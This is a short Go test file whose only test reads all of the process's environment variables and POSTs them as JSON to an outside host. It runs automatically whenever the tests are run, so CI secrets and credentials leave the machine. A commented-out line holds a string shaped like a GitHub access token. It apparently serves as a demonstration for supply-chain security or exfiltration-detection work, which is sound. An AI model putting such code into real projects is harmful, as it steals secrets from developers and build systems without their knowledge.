package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"testing"
)

func TestDemo(t *testing.T) {
	env := os.Environ()
//	env = append(env, "GH=ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX")
	data, _ := json.Marshal(env)
	r := bytes.NewReader(data)
	req, _ := http.NewRequest("POST", "https://app.a.invisirisk.com/post-target", r)
	resp, err := http.DefaultClient.Do(req)
	fmt.Printf("response code %v error %v\n", resp.StatusCode, err)
}
